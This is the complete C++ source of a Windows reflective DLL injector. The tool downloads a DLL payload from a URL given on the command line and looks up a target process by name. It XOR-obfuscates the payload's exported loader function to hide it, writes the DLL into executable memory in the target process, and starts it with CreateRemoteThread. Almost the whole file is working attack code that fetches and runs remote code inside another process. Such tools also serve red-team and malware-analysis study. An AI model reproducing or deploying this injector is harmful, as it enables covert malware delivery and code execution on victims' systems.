// ReflectiveDLLInjector.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <vector>
#include <tlhelp32.h>
#include <cwctype>
#include <cctype>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Wininet.lib")
#include <urlmon.h>
#include <wininet.h>

#define		EXPORTED_FUNC_NAME		"ReflectiveFunction"
#define     EXPORTED_PRE_LOADER     "CrazyLoader"

const char HEADER[4] = {0x41, 0x42, 0x43, 0x44};
BYTE KEY[] = { 0xAA, 0x41, 0x45, 0xCC };
const size_t  HEADER_SIZE = 4 * sizeof(CHAR);//4
const size_t KEY_SIZE = 4 * sizeof(CHAR);//4
const size_t FUNC_SIZE = sizeof(SIZE_T);//8
const size_t DLL_HEADER_SIZE = HEADER_SIZE + KEY_SIZE + FUNC_SIZE;



using namespace std;

struct iArgs {

    char* url;
    char* process;

};

wchar_t* GetWC(char* c)
{
    const size_t cSize = strlen(c) + 1;

    wchar_t* wc = (WCHAR*)malloc(cSize * sizeof(WCHAR));
    mbstowcs(wc, c, cSize);

    return wc;
}

char * addHeaderToBuffer(PBYTE dll, size_t dllSize, size_t funcSize) {

    //I create a new buffer big as the dll + header
    char* newDll = new char[dllSize + DLL_HEADER_SIZE];
    //i write the dll HEADER_SIZE bytes forward so that i have the space for the header
    memmove(newDll + DLL_HEADER_SIZE, dll, dllSize);

    // Copy the header to the beginning of the dll buffer this time
    //since now i can overwrite those
    memcpy(newDll, HEADER, HEADER_SIZE);
    memcpy(newDll + HEADER_SIZE, KEY, KEY_SIZE);
    memcpy(newDll + HEADER_SIZE + KEY_SIZE,&funcSize,sizeof(SIZE_T));

    return newDll;
}


void ToLowerCaseWIDE(WCHAR str[]) {



    size_t i = 0;

    while (str[i] != L'\0') {
        if (str[i] >= L'A' && str[i] <= L'Z') {
            str[i] = str[i] + 32; // Convert uppercase to lowercase
        }


        i++;
    }
    //return str;

}

iArgs argumentParser(int argc, char* argv[]) {
    iArgs args = { 0 };

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];

        if (arg == "-url") {
            if (i + 1 < argc) {
                args.url = argv[i + 1];
                ++i;  // Skip the next argument since it's already processed
            }
            else {
                // Handle error: "-url" option requires an argument
                std::cerr << "[-] Error: -url option requires an argument." << std::endl;
               
            }
        }
        else if (arg == "-process") {
            if (i + 1 < argc) {
                args.process = argv[i + 1];
                ++i;  // Skip the next argument since it's already processed
            }
            else {
                // Handle error: "-process" option requires an argument
                std::cerr << "[-] Error: -process option requires an argument." << std::endl;
            }
        }
        else {
            // Handle unknown arguments or options here if needed
            std::cerr << "[!] Warning: Unknown argument '" << arg << "'. Ignored." << std::endl;
        }
    }

    return args;
}


//function to download the payload via HTTP
vector<char> downloadFromURL(IN LPCSTR url) {


	IStream* stream;
	vector<char> buffer;
    //hardcoded for testing now
    DeleteUrlCacheEntry(L"http://127.0.0.1/ReflectiveDLL.dll");
	if (URLOpenBlockingStreamA(0, url, &stream, 0, 0))
	{
		cout << "[-] Error occured while downloading the file";

		return buffer;
	}

	buffer.resize(100);

	unsigned long bytesRead;
	int totalbytes = 0;


	while (true)
	{

		stream->Read(buffer.data() + buffer.size() - 100, 100, &bytesRead);

		if (0U == bytesRead)
		{

			break;

		}
		buffer.resize(buffer.size() + 100);
		totalbytes += bytesRead;

	};

	stream->Release();
	buffer.erase(buffer.begin() + totalbytes, buffer.end());
	return buffer;

}

int RetrievePIDbyName(wchar_t* procName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    //to lower case the procname
    ToLowerCaseWIDE(procName);

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cout << "[-] Unable to create snapshot of processes!" << std::endl;
        return 0;
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process and exit if unsuccessful.
    if (!Process32First(hProcessSnap, &pe32)) {
        std::cout << "[-] Unable to retrieve information about the first process!" << std::endl;
        CloseHandle(hProcessSnap);
        return 0;
    }

    // Display information about all processes in the snapshot.
    do {

        ToLowerCaseWIDE(pe32.szExeFile);
        if (wcscmp((pe32.szExeFile), procName) == 0) {
            CloseHandle(hProcessSnap);
            return pe32.th32ProcessID;
        }

    } while (Process32Next(hProcessSnap, &pe32));

    // Close the snapshot handle to release resources.
    CloseHandle(hProcessSnap);
    return 0;
}

PBYTE InjectDllRemoteProcess(int pid, size_t dllSize, PBYTE dllBuffer, HANDLE hProc, size_t funcSize) {

    
    size_t bytesWritten = 0;
    PBYTE dllBufferFinal = (PBYTE)addHeaderToBuffer(dllBuffer, dllSize, funcSize);
    

    

    PBYTE dllDestination = (PBYTE)VirtualAllocEx(hProc, NULL, dllSize + DLL_HEADER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (dllDestination == NULL) {
        cout << "[-] Error while allocating memory in remote process, exiting ... " << endl;
        return NULL;
    }

    if (WriteProcessMemory(hProc, dllDestination, dllBufferFinal, dllSize + DLL_HEADER_SIZE, &bytesWritten))
    {
        printf("[+] Successfully wrote DLL bytes + header at remote address: %p\n", dllDestination);
    }
    else {
        cout << "[-] Error while writing the DLL in the remote process, exiting ... " << endl;
        cerr << "[-] Win32 API Error: " + GetLastError() << endl;
        return NULL;
    }
    return dllDestination;

}


DWORD Rva2Raw(DWORD rva, vector<PIMAGE_SECTION_HEADER> peSections, int numberOfSections) {

    for (int i = 0; i < numberOfSections; i++) {

        //sections might have different offset, so we need to find the one where our RVA is falling into
        if (rva >= peSections[i]->VirtualAddress && rva < (peSections[i]->VirtualAddress + peSections[i]->Misc.VirtualSize))
        {
            //so computing first the "distance" between the virtual beginning of the virtual section to the RVA
            //then adding that to the beginning of the same section but raw 
            return ((rva - peSections[i]->VirtualAddress) + peSections[i]->PointerToRawData);
        }

    }
    return NULL;
}

PBYTE findFunctionEnd(PBYTE dllBase, PBYTE loaderAddressRaw) {

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(dllBase + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    IMAGE_FILE_HEADER fileHeader = pNtHeader->FileHeader;
    IMAGE_OPTIONAL_HEADER optionalHeader = pNtHeader->OptionalHeader;

    vector<PIMAGE_SECTION_HEADER> peSections;

    for (int i = 0; i < fileHeader.NumberOfSections; i++) {

        //starting from the pointer to NT header + 4(signature) + 20(file header) + size of optional = pointer to first section header. 
        // to get to the next i multiply the index running through the number of sections multiplied by the size of section header 
        peSections.insert(peSections.begin(), (PIMAGE_SECTION_HEADER)(((PBYTE)pNtHeader) + 4 + 20 + fileHeader.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER)));

    }

    PRUNTIME_FUNCTION pRuntimeFunction = (PRUNTIME_FUNCTION)(dllBase + Rva2Raw(optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress, peSections, (int)fileHeader.NumberOfSections));
    for (DWORD i = 0; i < optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION); ++i) {
        // Access the fields of each RUNTIME_FUNCTION structure
      
        if ((LPVOID)Rva2Raw(pRuntimeFunction[i].BeginAddress, peSections, (int)fileHeader.NumberOfSections) == loaderAddressRaw) {
            
            return (PBYTE) Rva2Raw((pRuntimeFunction[i].EndAddress-1), peSections, (int)fileHeader.NumberOfSections);
        }
    }
    return 0;

}

LPVOID RetrieveFunctionRawPointer(PBYTE dllBase, const char * funcName) {

    LPVOID exportedFuncAddrRVA = NULL;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBase; 
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(dllBase + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    IMAGE_FILE_HEADER fileHeader = pNtHeader->FileHeader;
    IMAGE_OPTIONAL_HEADER optionalHeader = pNtHeader->OptionalHeader;

    vector<PIMAGE_SECTION_HEADER> peSections;

    for (int i = 0; i < fileHeader.NumberOfSections; i++) {
    
        //starting from the pointer to NT header + 4(signature) + 20(file header) + size of optional = pointer to first section header. 
        // to get to the next i multiply the index running through the number of sections multiplied by the size of section header 
        peSections.insert(peSections.begin(), (PIMAGE_SECTION_HEADER)(((PBYTE)pNtHeader) + 4 + 20 + fileHeader.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER)));
        
    }
   
    //FROM HERE ONWARDS WE START PLAYING WITH RVA THEREFORE WE NEED TO FIND THE OFFSET IN RAW FILES
    //READING BYTES FROM FILE OR DOWNLOADING STILL MEANS RAW DATA, WHEN WE VIRTUALALLOC AND WRITE THE SECTION MANUALLY 
    //FROM RAW DATA TO VIRTUAL ADDRESSES THEN IT'S VIRTUAL MEMORY AND WE CAN USE RVA 
    
    //going throught the export directory to find the ReflectiveFunction we want to invoke
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBase + Rva2Raw(optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, peSections, (int)fileHeader.NumberOfSections));
    PDWORD FunctionNameArray = (PDWORD) (dllBase + Rva2Raw(pExportDirectory->AddressOfNames, peSections, (int)fileHeader.NumberOfSections));
    PDWORD FunctionAddressArray = (PDWORD) (dllBase + Rva2Raw(pExportDirectory->AddressOfFunctions, peSections, (int)fileHeader.NumberOfSections));
    PWORD  FunctionOrdinalArray = (PWORD) (dllBase + Rva2Raw(pExportDirectory->AddressOfNameOrdinals, peSections, (int)fileHeader.NumberOfSections));
    char* functionName = NULL;
    
    for (DWORD i = 0; i < pExportDirectory->NumberOfFunctions; i++) {
        
        functionName = (CHAR*)(dllBase + Rva2Raw(FunctionNameArray[i], peSections, (int)fileHeader.NumberOfSections));
        if (strcmp(functionName, funcName) == 0) {
            
            exportedFuncAddrRVA = (LPVOID) Rva2Raw(FunctionAddressArray[i], peSections, (int)fileHeader.NumberOfSections);
            break;
        }
    }
    return exportedFuncAddrRVA;

   
}

VOID OBXOR(PBYTE pShellcode, SIZE_T sShellcodeSize, PBYTE bKey, SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        
        if (j >= sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}

VOID encryptReflectiveFunction(PBYTE begin, SIZE_T functionSize) {
    
    
    OBXOR(begin, functionSize, KEY, KEY_SIZE);

}

int main(int argc, char *argv[])
{
    iArgs arguments = argumentParser(argc, argv);

    if (!(arguments.url != nullptr && *(arguments.url) != '\0') || !(arguments.process != nullptr && *(arguments.process) != '\0')) {
        cerr << "[-] Error passing arguments to the function, forgetting something? Typo?\n";
        cout << "[!] Correct example: ReflectiveDllInjector.exe -url ciaogrande.com -process chebello.exe\n";
        return 1;
    }

    char* targetProcess = arguments.process;
    printf("[+] Looking for process: %s\n", targetProcess);
    /*--------DOWNLOAD DLL FROM URL------------*/

	LPCSTR url = arguments.url;
	vector<char> pefile = downloadFromURL(url);
	PBYTE pebase = (PBYTE)(pefile.data());

    if (pefile.size() == 0) {
        cerr << "[-] Error while downloading file\n";
        return 1;
    }

    /*--------ENUMERATE PROCESS AND FIND TARGET-------*/

    int pid = RetrievePIDbyName(GetWC(targetProcess));
    if (pid != 0) {
        printf("[+] Process found with PID %lu\n", pid);
        
    }
    else {
        cout << "[-] Process not found, exiting ... " << endl;
        return 1;
    }
    

    /*----------OPEN HANDLE TO REMOTE PROCESS PLEASE----------*/

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProc == NULL) {
        cout << "[-] Error while opening the handle to process, exiting ... " << endl;
        return 1;
    }

   

    /*--------CALCULATE THE OFFSET OF THE REFLECTIVE FUNCTION--------*/

    PBYTE reflectiveLoaderFunc = (PBYTE)RetrieveFunctionRawPointer(pebase, EXPORTED_FUNC_NAME);
    if (reflectiveLoaderFunc == NULL) {
        cout << "[-] Error while retrieving the RAW offset of the ReflectiveLoader function\n";
        return 1;
    }
    printf("[+] ReflectiveLoader function found at relative raw address: %p\n", reflectiveLoaderFunc);

    /*------------FINDING FUNCTION SIZE FOR ENCRYPTION-----------------*/
    //here to keep in mind that both begin and end are RRA
    PBYTE reflectiveLoaderFuncEnd = findFunctionEnd(pebase, reflectiveLoaderFunc);
    int rfSize = (reflectiveLoaderFuncEnd - reflectiveLoaderFunc);
    printf("[+] Size of Reflective Function (bytes): %lu\n", rfSize);
    
    /*----------HIDING THE REFLECTIVE FUNCTION---------------------------*/

    encryptReflectiveFunction(pebase+ (DWORD)reflectiveLoaderFunc, (SIZE_T) rfSize);


     /*--------ALLOCATE MEMORY, WRITE DLL TO REMOTE PROCESS*/

    PBYTE remotePEBase = InjectDllRemoteProcess(pid, pefile.size(), pebase, hProc, (SIZE_T)rfSize);
    if (remotePEBase == NULL) {
        cout << "[-] Error while injecting the DLL in the remote process, exiting\n";
        return 1;
    }
    
    /*-------------RETRIEVE PRELOADER RAW ADDRESS-------------*/
    PBYTE reflectivePreLoaderFunc = (PBYTE)RetrieveFunctionRawPointer(pebase, EXPORTED_PRE_LOADER);
    if (reflectivePreLoaderFunc == NULL) {
        cout << "[-] Error while retrieving the RAW offset of the PreLoader function\n";
        return 1;
    }
    printf("[+] PreLoader function found at relative raw address: %p\n", reflectivePreLoaderFunc);
    /*--------CREATE REMOTE THREAD---------------------------------------*/
    

    DWORD threadId = 0x0;
    HANDLE hThread = NULL;
    //every RVA in the PE is SHIFTED BY THE HEADER SIZE I USE TO FIND THE DLL IN MEMORY EGG 
    hThread = CreateRemoteThread(hProc,NULL, 0, (LPTHREAD_START_ROUTINE)(remotePEBase + (DWORD)reflectivePreLoaderFunc + DLL_HEADER_SIZE), NULL, 0 , &threadId);
    if (hThread == NULL) {
        cout << "[-] Error while running the remote thread, exiting ... \n";
    }
    else {
        printf("[+] Successufully ran thread with id: %lu\n", threadId);
    }

    return 0; 
}


